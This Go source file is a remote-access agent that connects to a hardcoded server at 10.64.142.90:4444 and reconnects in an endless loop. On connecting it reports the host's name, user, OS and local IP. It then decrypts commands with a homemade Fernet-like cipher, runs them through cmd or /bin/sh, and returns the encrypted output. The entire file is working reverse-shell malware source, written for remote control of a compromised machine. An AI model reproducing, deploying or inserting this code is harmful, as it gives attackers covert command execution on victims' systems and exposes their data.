package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

const (
	SERVER_HOST = "10.64.142.90"
	SERVER_PORT = "4444"
)

var key []byte

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "N/A"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func fernetDecrypt(token []byte, key []byte) (string, error) {
	decoded := make([]byte, base64.StdEncoding.DecodedLen(len(token)))
	n, err := base64.StdEncoding.Decode(decoded, token)
	if err != nil {
		return "", err
	}
	decoded = decoded[:n]

	if len(decoded) < 57 {
		return "", fmt.Errorf("token too short")
	}

	version := decoded[0]
	if version != 0x80 {
		return "", fmt.Errorf("invalid version")
	}

	iv := decoded[9:25]
	ciphertext := decoded[25 : len(decoded)-32]
	receivedHMAC := decoded[len(decoded)-32:]

	signingKey := sha256.Sum256(append(key, []byte("signing")...))
	encryptionKey := sha256.Sum256(append(key, []byte("encryption")...))

	mac := hmac.New(sha256.New, signingKey[:32])
	mac.Write(decoded[:len(decoded)-32])
	computedHMAC := mac.Sum(nil)

	if !hmac.Equal(receivedHMAC, computedHMAC) {
		return "", fmt.Errorf("HMAC verification failed")
	}

	block, err := aes.NewCipher(encryptionKey[:16])
	if err != nil {
		return "", err
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	padding := int(plaintext[len(plaintext)-1])
	if padding > len(plaintext) {
		return "", fmt.Errorf("invalid padding")
	}
	plaintext = plaintext[:len(plaintext)-padding]

	return string(plaintext), nil
}

func fernetEncrypt(data string, key []byte) ([]byte, error) {
	version := byte(0x80)
	timestamp := time.Now().Unix()

	signingKey := sha256.Sum256(append(key, []byte("signing")...))
	encryptionKey := sha256.Sum256(append(key, []byte("encryption")...))

	block, err := aes.NewCipher(encryptionKey[:16])
	if err != nil {
		return nil, err
	}

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}

	plaintext := []byte(data)
	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	paddedPlaintext := make([]byte, len(plaintext)+padding)
	copy(paddedPlaintext, plaintext)
	for i := len(plaintext); i < len(paddedPlaintext); i++ {
		paddedPlaintext[i] = byte(padding)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	ciphertext := make([]byte, len(paddedPlaintext))
	mode.CryptBlocks(ciphertext, paddedPlaintext)

	payload := new(bytes.Buffer)
	payload.WriteByte(version)
	binary.Write(payload, binary.BigEndian, timestamp)
	payload.Write(iv)
	payload.Write(ciphertext)

	mac := hmac.New(sha256.New, signingKey[:32])
	mac.Write(payload.Bytes())
	hmacSum := mac.Sum(nil)

	token := append(payload.Bytes(), hmacSum...)

	return []byte(base64.StdEncoding.EncodeToString(token)), nil
}

func executeCommand(command string, systemInfo map[string]string) string {
	if command == "SYSINFO" {
		output := fmt.Sprintf("OS: %s\n", systemInfo["os"])
		output += fmt.Sprintf("Hostname: %s\n", systemInfo["hostname"])
		output += fmt.Sprintf("User: %s\n", systemInfo["user"])
		output += fmt.Sprintf("Arch: %s\n", systemInfo["arch"])
		output += fmt.Sprintf("Agent IP: %s\n", systemInfo["agentIP"])
		output += fmt.Sprintf("Go Version: %s\n", runtime.Version())
		output += fmt.Sprintf("Current Dir: %s", systemInfo["cwd"])
		return output
	} else if command == "SCREENSHOT" {
		return "ERROR: Screenshot not supported in Go agent"
	} else if strings.ToLower(command) == "exit" || strings.ToLower(command) == "quit" || strings.ToLower(command) == "disconnect" {
		return "Agent disconnecting..."
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("ERROR: %s", err.Error())
	}

	if len(output) == 0 {
		return "Command executed (no output)"
	}

	return string(output)
}

func main() {
	for {
		err := connectToServer()
		if err != nil {
			fmt.Printf("[-] Error: %s\n", err.Error())
		}

		fmt.Println("[*] Reconnecting in 5 seconds...")
		time.Sleep(5 * time.Second)
	}
}

func connectToServer() error {
	fmt.Printf("[*] Connecting to %s:%s\n", SERVER_HOST, SERVER_PORT)

	conn, err := net.DialTimeout("tcp", SERVER_HOST+":"+SERVER_PORT, 10*time.Second)
	if err != nil {
		return err
	}
	defer conn.Close()

	fmt.Println("[+] Connected!")

	keyBuf := make([]byte, 1024)
	n, err := conn.Read(keyBuf)
	if err != nil {
		return err
	}

	key = bytes.TrimRight(keyBuf[:n], "\x00\r\n")

	fmt.Printf("[+] Key received (%d bytes)\n", len(key))

	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	username := "unknown"
	if currentUser != nil {
		username = currentUser.Username
	}
	osName := runtime.GOOS
	arch := runtime.GOARCH
	agentIP := getLocalIP()
	cwd, _ := os.Getwd()

	systemInfo := map[string]string{
		"os":       osName,
		"hostname": hostname,
		"user":     username,
		"arch":     arch,
		"agentIP":  agentIP,
		"cwd":      cwd,
	}

	info := map[string]string{
		"os":            osName,
		"hostname":      hostname,
		"user":          username,
		"architecture":  arch,
		"agentIP":       agentIP,
		"pythonVersion": "Go-" + runtime.Version(),
	}

	infoJSON, _ := json.Marshal(info)
	conn.Write(infoJSON)
	time.Sleep(500 * time.Millisecond)

	fmt.Println("[+] Handshake complete")

	for {
		conn.SetReadDeadline(time.Now().Add(300 * time.Second))

		encryptedCmd := make([]byte, 8192)
		n, err := conn.Read(encryptedCmd)
		if err != nil {
			if err == io.EOF {
				fmt.Println("[-] Connection closed by server")
			} else {
				fmt.Printf("[-] Read error: %s\n", err.Error())
			}
			break
		}

		encryptedCmd = encryptedCmd[:n]

		command, err := fernetDecrypt(encryptedCmd, key)
		if err != nil {
			fmt.Printf("[-] Failed to decrypt command: %s\n", err.Error())
			continue
		}

		if len(command) > 50 {
			fmt.Printf("[+] Command received: %s...\n", command[:50])
		} else {
			fmt.Printf("[+] Command received: %s\n", command)
		}

		output := executeCommand(command, systemInfo)

		if len(output) > 1000000 {
			output = output[:1000000] + "\n...[OUTPUT TRUNCATED - TOO LARGE]"
		}

		encryptedOutput, err := fernetEncrypt(output, key)
		if err != nil {
			fmt.Printf("[-] Failed to encrypt output: %s\n", err.Error())
			continue
		}

		conn.Write(encryptedOutput)
		conn.Write([]byte("<END>"))

		fmt.Printf("[+] Response sent (%d bytes)\n", len(encryptedOutput))

		if strings.ToLower(command) == "exit" || strings.ToLower(command) == "quit" || strings.ToLower(command) == "disconnect" {
			break
		}
	}

	fmt.Println("[*] Disconnected")
	return nil
}